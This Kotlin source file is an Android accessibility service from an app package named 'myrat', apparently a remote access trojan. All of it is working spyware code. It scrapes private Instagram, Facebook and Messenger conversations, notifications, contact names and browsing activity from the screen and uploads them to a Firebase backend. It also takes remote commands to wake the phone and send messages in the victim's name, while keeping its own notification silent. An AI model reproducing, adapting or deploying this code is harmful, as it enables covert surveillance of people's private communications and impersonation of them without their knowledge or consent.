package com.myrat.app.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.KeyguardManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.core.app.NotificationCompat
import com.google.firebase.database.*
import com.myrat.app.MainActivity
import com.myrat.app.R
import com.myrat.app.utils.Logger
import kotlinx.coroutines.*
import java.security.MessageDigest
import java.util.concurrent.ConcurrentHashMap

class SocialMediaService : AccessibilityService() {

    private val db = FirebaseDatabase.getInstance().reference
    private lateinit var deviceId: String
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val messageCache = ConcurrentHashMap<String, Long>()
    private val contactCache = ConcurrentHashMap<String, Boolean>()
    private val valueEventListener = ConcurrentHashMap<String, ValueEventListener>()
    private val CACHE_DURATION = 24 * 60 * 60 * 1000L // 24 hours
    private val NOTIFICATION_ID = 13
    private val CHANNEL_ID = "SocialMediaService"
    private var wakeLock: PowerManager.WakeLock? = null
    private var screenWakeLock: PowerManager.WakeLock? = null
    private val handler = Handler(Looper.getMainLooper())
    private var lastNotificationTime = 0L
    private val pendingCommands = mutableListOf<SendCommand>()
    private var isProcessingCommand = false

    companion object {
        const val INSTAGRAM_PACKAGE = "com.instagram.android"
        const val FACEBOOK_PACKAGE = "com.facebook.katana"
        const val MESSENGER_PACKAGE = "com.facebook.orca"
        const val FACEBOOK_LITE_PACKAGE = "com.facebook.lite"

        // Enhanced view IDs for better compatibility across social media apps
        private val MESSAGE_TEXT_IDS = listOf(
            "message_text", "text_message", "message_body", "chat_message_text", "message_content",
            "row_thread_item_text_send", "row_thread_item_text_recv", "message_text_view",
            "direct_text_message_text_view", "text_view", "message_bubble_text"
        )
        
        private val CONVERSATION_LAYOUT_IDS = listOf(
            "conversation_layout", "chat_layout", "conversation_container", "chat_container",
            "thread_view", "direct_thread_view", "message_list", "chat_messages_container"
        )
        
        private val CONVERSATIONS_ROW_IDS = listOf(
            "conversations_row", "chat_row", "conversation_item", "chat_item",
            "thread_list_item", "direct_inbox_row", "inbox_item"
        )
        
        private val DATE_IDS = listOf(
            "date", "time", "timestamp", "message_time", "message_timestamp",
            "message_timestamp_text", "time_text"
        )
        
        private val CONTACT_NAME_IDS = listOf(
            "conversation_contact_name", "contact_name", "chat_title", "header_title", "toolbar_title",
            "thread_title", "direct_thread_title", "username", "display_name"
        )
        
        private val SEARCH_IDS = listOf(
            "menuitem_search", "search", "search_button", "action_search",
            "search_edit_text", "search_bar"
        )
        
        private val SEARCH_INPUT_IDS = listOf(
            "search_input", "search_field", "search_edit_text", "search_src_text",
            "search_box", "query_text"
        )
        
        private val MESSAGE_ENTRY_IDS = listOf(
            "entry", "message_entry", "input_message", "chat_input", "compose_text",
            "message_composer", "text_input", "compose_text_view", "message_edit_text"
        )
        
        private val SEND_IDS = listOf(
            "send", "send_button", "btn_send", "send_message_button",
            "composer_send_button", "send_icon"
        )

        private val STORY_IDS = listOf(
            "story_viewer", "story_container", "story_item", "reel_viewer"
        )

        private val POST_IDS = listOf(
            "feed_item", "post_container", "media_container", "photo_container"
        )
    }

    data class SendCommand(
        val username: String,
        val message: String,
        val packageName: String,
        val timestamp: Long = System.currentTimeMillis(),
        val retryCount: Int = 0
    )

    override fun onCreate() {
        super.onCreate()
        try {
            acquireWakeLocks()
            deviceId = MainActivity.getDeviceId(this)
            Logger.log("SocialMediaService started for deviceId: $deviceId")
            startForegroundService()
            setupAccessibilityService()
            loadKnownContacts()
            scheduleCacheCleanup()
            listenForSendMessageCommands()
            setupNotificationMonitoring()
            setupCommandProcessor()
        } catch (e: Exception) {
            Logger.error("Failed to create SocialMediaService", e)
        }
    }

    private fun acquireWakeLocks() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager

            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "SocialMediaService:KeepAlive"
            )
            wakeLock?.acquire(60 * 60 * 1000L) // 1 hour

            screenWakeLock = powerManager.newWakeLock(
                PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.ON_AFTER_RELEASE,
                "SocialMediaService:ScreenWake"
            )

            Logger.log("Wake locks acquired for SocialMediaService")
        } catch (e: Exception) {
            Logger.error("Failed to acquire wake locks for social media", e)
        }
    }

    private fun startForegroundService() {
        try {
            val channelName = "Social Media Monitoring Service"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(
                    CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_LOW
                ).apply {
                    setShowBadge(false)
                    enableLights(false)
                    enableVibration(false)
                    setSound(null, null)
                }
                (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                    .createNotificationChannel(channel)
            }

            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Social Media Monitor")
                .setContentText("Monitoring Instagram, Facebook, and Messenger")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setSilent(true)
                .setShowWhen(false)
                .setOngoing(true)
                .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
                .build()

            startForeground(NOTIFICATION_ID, notification)
        } catch (e: Exception) {
            Logger.error("Failed to start social media foreground service", e)
        }
    }

    private fun setupAccessibilityService() {
        try {
            val info = AccessibilityServiceInfo().apply {
                eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                        AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                        AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_CLICKED or
                        AccessibilityEvent.TYPE_VIEW_FOCUSED or
                        AccessibilityEvent.TYPE_VIEW_SELECTED

                feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
                flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                        AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                        AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                        AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY

                packageNames = arrayOf(
                    INSTAGRAM_PACKAGE, 
                    FACEBOOK_PACKAGE, 
                    MESSENGER_PACKAGE, 
                    FACEBOOK_LITE_PACKAGE
                )

                notificationTimeout = 50
            }
            serviceInfo = info
            Logger.log("Accessibility service configured for social media monitoring")
        } catch (e: Exception) {
            Logger.error("Failed to setup accessibility service", e)
        }
    }

    private fun setupNotificationMonitoring() {
        scope.launch {
            while (isActive) {
                try {
                    delay(2000) // Check every 2 seconds

                    if (!isProcessingCommand && pendingCommands.isNotEmpty()) {
                        processNextCommand()
                    }

                } catch (e: Exception) {
                    Logger.error("Error in notification monitoring", e)
                }
            }
        }
    }

    private fun setupCommandProcessor() {
        scope.launch {
            while (isActive) {
                try {
                    delay(1000) // Check every second for commands

                    if (!isProcessingCommand && pendingCommands.isNotEmpty()) {
                        processNextCommand()
                    }

                } catch (e: Exception) {
                    Logger.error("Error in command processor", e)
                }
            }
        }
    }

    private suspend fun processNextCommand() {
        if (isProcessingCommand || pendingCommands.isEmpty()) return

        isProcessingCommand = true
        try {
            val command = pendingCommands.removeAt(0)
            Logger.log("Processing social media command: ${command.username} - ${command.message}")

            wakeUpScreen()
            sendSocialMediaMessage(command.username, command.message, command.packageName)

            delay(2000) // Wait between commands
        } catch (e: Exception) {
            Logger.error("Error processing command", e)
        } finally {
            isProcessingCommand = false
        }
    }

    private fun wakeUpScreen() {
        try {
            val keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager

            if (!powerManager.isInteractive || keyguardManager.isKeyguardLocked) {
                Logger.log("Waking up screen for social media interaction")

                screenWakeLock?.let { wakeLock ->
                    if (!wakeLock.isHeld) {
                        wakeLock.acquire(30000) // 30 seconds
                        Logger.log("Screen wake lock acquired")
                    }
                }

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
                    try {
                        val intent = Intent(Intent.ACTION_MAIN).apply {
                            addCategory(Intent.CATEGORY_HOME)
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        startActivity(intent)
                    } catch (e: Exception) {
                        Logger.error("Failed to wake screen with intent", e)
                    }
                }
            }
        } catch (e: Exception) {
            Logger.error("Error waking up screen", e)
        }
    }

    private fun scheduleCacheCleanup() {
        scope.launch {
            try {
                while (isActive) {
                    delay(60_000)
                    val now = System.currentTimeMillis()
                    val removedEntries = messageCache.entries.filter { now - it.value > CACHE_DURATION }
                    removedEntries.forEach { messageCache.remove(it.key) }
                    if (removedEntries.isNotEmpty()) {
                        Logger.log("Cache cleaned, removed ${removedEntries.size} entries, size: ${messageCache.size}")
                    }
                }
            } catch (e: Exception) {
                Logger.error("Error in cache cleanup", e)
            }
        }
    }

    private fun loadKnownContacts() {
        try {
            db.child("Device").child(deviceId).child("social_media/contacts")
                .get().addOnSuccessListener { snapshot ->
                    snapshot.children.forEach { contact ->
                        contactCache[contact.key!!] = true
                    }
                    Logger.log("Loaded ${contactCache.size} known social media contacts")
                }.addOnFailureListener { e ->
                    Logger.log("Failed to load social media contacts: ${e.message}")
                }
        } catch (e: Exception) {
            Logger.error("Error loading known social media contacts", e)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return

        val packageName = event.packageName?.toString() ?: return
        if (packageName !in arrayOf(INSTAGRAM_PACKAGE, FACEBOOK_PACKAGE, MESSENGER_PACKAGE, FACEBOOK_LITE_PACKAGE)) return

        scope.launch {
            try {
                when (event.eventType) {
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                        handleContentChange(event, packageName)
                    }
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                        handleWindowStateChange(event, packageName)
                    }
                    AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                        handleNotificationChange(event, packageName)
                    }
                }
            } catch (e: Exception) {
                Logger.error("Error processing accessibility event: ${e.message}", e)
            }
        }
    }

    private fun handleNotificationChange(event: AccessibilityEvent, packageName: String) {
        try {
            val notificationText = event.text?.joinToString(" ") ?: return
            if (notificationText.isBlank()) return

            val timestamp = System.currentTimeMillis()

            // Parse notification for sender and message
            val parts = notificationText.split(":", limit = 2)
            if (parts.size >= 2) {
                val sender = parts[0].trim()
                val message = parts[1].trim()

                if (sender.isNotEmpty() && message.isNotEmpty()) {
                    val messageId = generateMessageId(sender, message, timestamp, packageName, "Received")

                    if (!messageCache.containsKey(messageId)) {
                        messageCache[messageId] = timestamp

                        val isNewContact = !contactCache.containsKey(sender)
                        if (isNewContact) {
                            contactCache[sender] = true
                        }

                        val messageData = mapOf(
                            "sender" to sender,
                            "recipient" to "You",
                            "content" to message,
                            "timestamp" to timestamp,
                            "type" to "Received",
                            "isNewContact" to isNewContact,
                            "uploaded" to System.currentTimeMillis(),
                            "messageId" to messageId,
                            "packageName" to packageName,
                            "platform" to getPlatformName(packageName),
                            "direction" to "Received",
                            "source" to "notification"
                        )

                        Logger.log("New social media message from notification: $sender -> $message (${getPlatformName(packageName)})")
                        uploadMessage(messageData)
                    }
                }
            }
        } catch (e: Exception) {
            Logger.error("Error handling notification change", e)
        }
    }

    private fun handleContentChange(event: AccessibilityEvent, packageName: String) {
        try {
            val rootNode = rootInActiveWindow ?: return

            if (isChatScreen(rootNode, packageName)) {
                val messageNodes = findMessageNodes(rootNode, packageName)
                messageNodes.forEach { node ->
                    extractAndUploadMessage(node, packageName)
                }
                extractChatMetadata(rootNode, packageName)
            } else if (isStoryScreen(rootNode, packageName)) {
                extractStoryData(rootNode, packageName)
            } else if (isFeedScreen(rootNode, packageName)) {
                extractFeedData(rootNode, packageName)
            }
        } catch (e: Exception) {
            Logger.error("Error handling content change", e)
        }
    }

    private fun handleWindowStateChange(event: AccessibilityEvent, packageName: String) {
        try {
            val rootNode = rootInActiveWindow ?: return

            if (isChatListScreen(rootNode, packageName)) {
                extractChatListData(rootNode, packageName)
            } else if (isChatScreen(rootNode, packageName)) {
                extractChatMetadata(rootNode, packageName)
            }
        } catch (e: Exception) {
            Logger.error("Error handling window state change", e)
        }
    }

    private fun isChatScreen(rootNode: AccessibilityNodeInfo, packageName: String): Boolean {
        return try {
            CONVERSATION_LAYOUT_IDS.any { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").isNotEmpty()
            }
        } catch (e: Exception) {
            Logger.error("Error checking if chat screen", e)
            false
        }
    }

    private fun isChatListScreen(rootNode: AccessibilityNodeInfo, packageName: String): Boolean {
        return try {
            CONVERSATIONS_ROW_IDS.any { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").isNotEmpty()
            }
        } catch (e: Exception) {
            Logger.error("Error checking if chat list screen", e)
            false
        }
    }

    private fun isStoryScreen(rootNode: AccessibilityNodeInfo, packageName: String): Boolean {
        return try {
            STORY_IDS.any { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").isNotEmpty()
            }
        } catch (e: Exception) {
            false
        }
    }

    private fun isFeedScreen(rootNode: AccessibilityNodeInfo, packageName: String): Boolean {
        return try {
            POST_IDS.any { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").isNotEmpty()
            }
        } catch (e: Exception) {
            false
        }
    }

    private fun findMessageNodes(rootNode: AccessibilityNodeInfo, packageName: String): List<AccessibilityNodeInfo> {
        return try {
            MESSAGE_TEXT_IDS.flatMap { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id")
            }
        } catch (e: Exception) {
            Logger.error("Error finding message nodes", e)
            emptyList()
        }
    }

    private fun extractAndUploadMessage(node: AccessibilityNodeInfo, packageName: String) {
        try {
            val messageText = node.text?.toString() ?: return
            if (messageText.isBlank()) return

            val parent = node.parent ?: return
            val timestamp = getTimestampFromNode(parent, packageName) ?: System.currentTimeMillis()

            val direction = if (isOutgoingMessage(parent, packageName)) "Sent" else "Received"
            val chatName = getCurrentChatName(packageName) ?: "Unknown"

            val isNewContact = !contactCache.containsKey(chatName) && direction == "Received"
            if (isNewContact) {
                contactCache[chatName] = true
                db.child("Device").child(deviceId).child("social_media/contacts").child(chatName)
                    .setValue(mapOf(
                        "profileUrl" to getContactProfile(chatName, packageName),
                        "platform" to getPlatformName(packageName),
                        "firstSeen" to System.currentTimeMillis()
                    ))
            }

            val messageId = generateMessageId(chatName, messageText, timestamp, packageName, direction)
            if (messageCache.containsKey(messageId)) {
                return // Duplicate message
            }
            messageCache[messageId] = timestamp

            val messageData = mapOf(
                "sender" to (if (direction == "Sent") "You" else chatName),
                "recipient" to (if (direction == "Sent") chatName else "You"),
                "content" to messageText,
                "timestamp" to timestamp,
                "type" to if (isReplyMessage(parent, packageName)) "Reply" else direction,
                "isNewContact" to isNewContact,
                "uploaded" to System.currentTimeMillis(),
                "messageId" to messageId,
                "packageName" to packageName,
                "platform" to getPlatformName(packageName),
                "direction" to direction,
                "source" to "accessibility"
            )

            Logger.log("New social media message: ${messageData["type"]} from ${messageData["sender"]} (${getPlatformName(packageName)})")
            uploadMessage(messageData)
        } catch (e: Exception) {
            Logger.error("Error extracting and uploading message", e)
        }
    }

    private fun extractStoryData(rootNode: AccessibilityNodeInfo, packageName: String) {
        try {
            val storyData = mapOf(
                "type" to "story_view",
                "timestamp" to System.currentTimeMillis(),
                "platform" to getPlatformName(packageName),
                "packageName" to packageName
            )

            db.child("Device").child(deviceId).child("social_media/activity").push().setValue(storyData)
            Logger.log("Story activity recorded for ${getPlatformName(packageName)}")
        } catch (e: Exception) {
            Logger.error("Error extracting story data", e)
        }
    }

    private fun extractFeedData(rootNode: AccessibilityNodeInfo, packageName: String) {
        try {
            val feedData = mapOf(
                "type" to "feed_view",
                "timestamp" to System.currentTimeMillis(),
                "platform" to getPlatformName(packageName),
                "packageName" to packageName
            )

            db.child("Device").child(deviceId).child("social_media/activity").push().setValue(feedData)
            Logger.log("Feed activity recorded for ${getPlatformName(packageName)}")
        } catch (e: Exception) {
            Logger.error("Error extracting feed data", e)
        }
    }

    private fun getTimestampFromNode(parent: AccessibilityNodeInfo, packageName: String): Long? {
        return try {
            DATE_IDS.forEach { id ->
                val timestampNode = parent.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
                if (timestampNode != null) {
                    return parseTimestamp(timestampNode.text?.toString())
                }
            }
            null
        } catch (e: Exception) {
            null
        }
    }

    private fun isOutgoingMessage(parent: AccessibilityNodeInfo, packageName: String): Boolean {
        return try {
            // Check for outgoing message indicators specific to each platform
            when (packageName) {
                INSTAGRAM_PACKAGE -> {
                    parent.findAccessibilityNodeInfosByViewId("$packageName:id/direct_text_message_text_view_outgoing").isNotEmpty()
                }
                MESSENGER_PACKAGE, FACEBOOK_PACKAGE -> {
                    parent.findAccessibilityNodeInfosByViewId("$packageName:id/row_thread_item_text_send").isNotEmpty()
                }
                else -> false
            }
        } catch (e: Exception) {
            false
        }
    }

    private fun generateMessageId(sender: String, text: String, timestamp: Long, packageName: String, direction: String): String {
        return try {
            val input = "$sender$text$timestamp$packageName$direction${System.nanoTime()}"
            MessageDigest.getInstance("SHA-256")
                .digest(input.toByteArray())
                .joinToString("") { "%02x".format(it) }
                .substring(0, 32)
        } catch (e: Exception) {
            Logger.error("Error generating message ID", e)
            "error_${System.currentTimeMillis()}_${(1000..9999).random()}"
        }
    }

    private fun parseTimestamp(timestampStr: String?): Long {
        return try {
            timestampStr?.let {
                when {
                    it.contains(":") -> System.currentTimeMillis()
                    it.matches(Regex("\\d+")) -> it.toLongOrNull() ?: System.currentTimeMillis()
                    else -> System.currentTimeMillis()
                }
            } ?: System.currentTimeMillis()
        } catch (e: Exception) {
            System.currentTimeMillis()
        }
    }

    private fun isReplyMessage(parent: AccessibilityNodeInfo, packageName: String): Boolean {
        return try {
            parent.findAccessibilityNodeInfosByViewId("$packageName:id/quoted_message").isNotEmpty() ||
            parent.findAccessibilityNodeInfosByViewId("$packageName:id/reply_message").isNotEmpty()
        } catch (e: Exception) {
            false
        }
    }

    private fun getCurrentChatName(packageName: String): String? {
        return try {
            val rootNode = rootInActiveWindow ?: return null
            CONTACT_NAME_IDS.forEach { id ->
                val titleNode = rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
                if (titleNode != null) {
                    return titleNode.text?.toString()
                }
            }
            null
        } catch (e: Exception) {
            Logger.error("Error getting current chat name", e)
            null
        }
    }

    private fun getContactProfile(contactName: String, packageName: String): String {
        Logger.log("Profile access for $contactName (${getPlatformName(packageName)}) - placeholder implementation")
        return ""
    }

    private fun getPlatformName(packageName: String): String {
        return when (packageName) {
            INSTAGRAM_PACKAGE -> "Instagram"
            FACEBOOK_PACKAGE -> "Facebook"
            MESSENGER_PACKAGE -> "Messenger"
            FACEBOOK_LITE_PACKAGE -> "Facebook Lite"
            else -> "Unknown"
        }
    }

    private fun uploadMessage(message: Map<String, Any>) {
        scope.launch {
            try {
                val messagesRef = db.child("Device").child(deviceId).child("social_media/data")
                messagesRef.child(message["messageId"] as String).setValue(message)
                    .addOnSuccessListener {
                        Logger.log("Social media message uploaded: ${message["content"]} (${message["platform"]})")
                    }
                    .addOnFailureListener { e ->
                        Logger.error("Social media message upload failed: ${e.message}", e)
                    }
            } catch (e: Exception) {
                Logger.error("Error uploading social media message", e)
            }
        }
    }

    private fun extractChatListData(rootNode: AccessibilityNodeInfo, packageName: String) {
        try {
            val chatNodes = CONVERSATIONS_ROW_IDS.flatMap { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id")
            }
            val chats = mutableListOf<Map<String, Any>>()

            chatNodes.forEach { chatNode ->
                val name = CONTACT_NAME_IDS.mapNotNull { id ->
                    chatNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()?.text?.toString()
                }.firstOrNull() ?: ""

                val lastMessage = chatNode.findAccessibilityNodeInfosByViewId("$packageName:id/last_message")
                    .firstOrNull()?.text?.toString() ?: ""

                val timestamp = DATE_IDS.mapNotNull { id ->
                    chatNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()?.text?.toString()
                }.firstOrNull()?.let { parseTimestamp(it) } ?: 0L

                if (name.isNotEmpty()) {
                    chats.add(mapOf(
                        "name" to name,
                        "lastMessage" to lastMessage,
                        "timestamp" to timestamp,
                        "platform" to getPlatformName(packageName),
                        "packageName" to packageName
                    ))
                }
            }

            if (chats.isNotEmpty()) {
                db.child("Device").child(deviceId).child("social_media/chats").setValue(chats)
                    .addOnSuccessListener {
                        Logger.log("Social media chat list uploaded: ${chats.size} chats (${getPlatformName(packageName)})")
                    }
                    .addOnFailureListener { e ->
                        Logger.error("Failed to upload social media chat list (${getPlatformName(packageName)}): ${e.message}", e)
                    }
            }
        } catch (e: Exception) {
            Logger.error("Error extracting chat list data", e)
        }
    }

    private fun extractChatMetadata(rootNode: AccessibilityNodeInfo, packageName: String) {
        try {
            val chatName = getCurrentChatName(packageName) ?: return
            val profileUrl = getContactProfile(chatName, packageName)
            if (profileUrl.isNotEmpty()) {
                db.child("Device").child(deviceId).child("social_media/contacts").child(chatName)
                    .setValue(mapOf(
                        "profileUrl" to profileUrl,
                        "platform" to getPlatformName(packageName)
                    ))
            }
        } catch (e: Exception) {
            Logger.error("Error extracting chat metadata", e)
        }
    }

    private fun listenForSendMessageCommands() {
        try {
            val sendRef = db.child("Device").child(deviceId).child("social_media/commands")
            val listener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        snapshot.children.forEach { command ->
                            val username = command.child("username").getValue(String::class.java) ?: return@forEach
                            val message = command.child("message").getValue(String::class.java) ?: return@forEach
                            val packageName = command.child("packageName").getValue(String::class.java) ?: INSTAGRAM_PACKAGE

                            Logger.log("Received social media send command for $username: $message (${getPlatformName(packageName)})")

                            pendingCommands.add(SendCommand(username, message, packageName))
                            command.ref.removeValue()
                        }
                    } catch (e: Exception) {
                        Logger.error("Error processing social media send commands", e)
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Logger.error("Failed to read social media send command: ${error.message}")
                }
            }
            valueEventListener["sendCommands"] = listener
            sendRef.addValueEventListener(listener)
        } catch (e: Exception) {
            Logger.error("Error setting up social media send message commands listener", e)
        }
    }

    private suspend fun sendSocialMediaMessage(recipient: String, message: String, packageName: String) {
        try {
            Logger.log("🚀 Starting to send social media message to $recipient via ${getPlatformName(packageName)}")

            wakeUpScreen()
            delay(1000)

            // Open the social media app
            val intent = packageManager.getLaunchIntentForPackage(packageName)?.apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
            } ?: run {
                Logger.error("${getPlatformName(packageName)} not installed")
                return
            }

            startActivity(intent)
            delay(4000) // Wait for app to load

            // Navigate to messages/DMs section
            navigateToMessages(packageName)
            delay(2000)

            // Search for recipient
            if (searchForRecipient(recipient, packageName)) {
                delay(2000)
                
                // Send message
                if (sendMessageToRecipient(message, packageName)) {
                    Logger.log("🎉 Successfully sent social media message to $recipient (${getPlatformName(packageName)})")
                    
                    // Log sent message
                    val messageData = mapOf(
                        "sender" to "You",
                        "recipient" to recipient,
                        "content" to message,
                        "timestamp" to System.currentTimeMillis(),
                        "type" to "Sent",
                        "isNewContact" to !contactCache.containsKey(recipient),
                        "uploaded" to System.currentTimeMillis(),
                        "messageId" to generateMessageId("You", message, System.currentTimeMillis(), packageName, "Sent"),
                        "packageName" to packageName,
                        "platform" to getPlatformName(packageName),
                        "direction" to "Sent",
                        "source" to "command"
                    )
                    uploadMessage(messageData)
                }
            }

            // Release screen wake lock after sending
            screenWakeLock?.let { wakeLock ->
                if (wakeLock.isHeld) {
                    wakeLock.release()
                    Logger.log("Screen wake lock released after sending")
                }
            }

        } catch (e: Exception) {
            Logger.error("Error sending social media message (${getPlatformName(packageName)}): ${e.message}", e)

            screenWakeLock?.let { wakeLock ->
                if (wakeLock.isHeld) {
                    wakeLock.release()
                }
            }
        }
    }

    private suspend fun navigateToMessages(packageName: String): Boolean {
        return try {
            val rootNode = rootInActiveWindow ?: return false
            
            // Platform-specific navigation to messages
            when (packageName) {
                INSTAGRAM_PACKAGE -> {
                    // Look for DM icon in Instagram
                    val dmButton = rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/direct_inbox_button").firstOrNull()
                        ?: rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/action_bar_inbox_button").firstOrNull()
                    
                    dmButton?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    Logger.log("Navigated to Instagram DMs")
                    true
                }
                MESSENGER_PACKAGE -> {
                    // Messenger opens directly to messages
                    Logger.log("Messenger opened to messages")
                    true
                }
                FACEBOOK_PACKAGE -> {
                    // Look for messages icon in Facebook
                    val messagesButton = rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/messages_tab").firstOrNull()
                    messagesButton?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    Logger.log("Navigated to Facebook messages")
                    true
                }
                else -> false
            }
        } catch (e: Exception) {
            Logger.error("Error navigating to messages", e)
            false
        }
    }

    private suspend fun searchForRecipient(recipient: String, packageName: String): Boolean {
        return try {
            val rootNode = rootInActiveWindow ?: return false
            
            // Find search button
            val searchButton = SEARCH_IDS.mapNotNull { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
            }.firstOrNull()

            if (searchButton != null) {
                searchButton.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                delay(1000)

                // Find search input field
                val searchField = SEARCH_INPUT_IDS.mapNotNull { id ->
                    rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
                }.firstOrNull()

                if (searchField != null) {
                    searchField.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
                    delay(500)

                    val args = Bundle().apply {
                        putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, recipient)
                    }
                    searchField.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
                    delay(2000)

                    // Click on first result
                    val firstResult = rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/search_result_item").firstOrNull()
                        ?: CONVERSATIONS_ROW_IDS.mapNotNull { id ->
                            rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
                        }.firstOrNull()

                    firstResult?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    Logger.log("Selected recipient: $recipient")
                    return true
                }
            }
            false
        } catch (e: Exception) {
            Logger.error("Error searching for recipient", e)
            false
        }
    }

    private suspend fun sendMessageToRecipient(message: String, packageName: String): Boolean {
        return try {
            val rootNode = rootInActiveWindow ?: return false

            // Find message input field
            val messageInput = MESSAGE_ENTRY_IDS.mapNotNull { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
            }.firstOrNull()

            if (messageInput != null) {
                messageInput.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
                delay(500)

                val messageArgs = Bundle().apply {
                    putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, message)
                }
                messageInput.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, messageArgs)
                delay(1000)

                // Find and click send button
                val sendButton = SEND_IDS.mapNotNull { id ->
                    rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
                }.firstOrNull()

                sendButton?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                Logger.log("Message sent successfully")
                return true
            }
            false
        } catch (e: Exception) {
            Logger.error("Error sending message", e)
            false
        }
    }

    override fun onInterrupt() {
        Logger.log("SocialMediaService interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                }
            }
            screenWakeLock?.let {
                if (it.isHeld) {
                    it.release()
                }
            }

            scope.cancel()
            valueEventListener.forEach { (_, listener) ->
                db.child("Device").child(deviceId).child("social_media/commands")
                    .removeEventListener(listener)
            }
            valueEventListener.clear()
            Logger.log("SocialMediaService destroyed")
        } catch (e: Exception) {
            Logger.error("Error destroying SocialMediaService", e)
        }
    }
}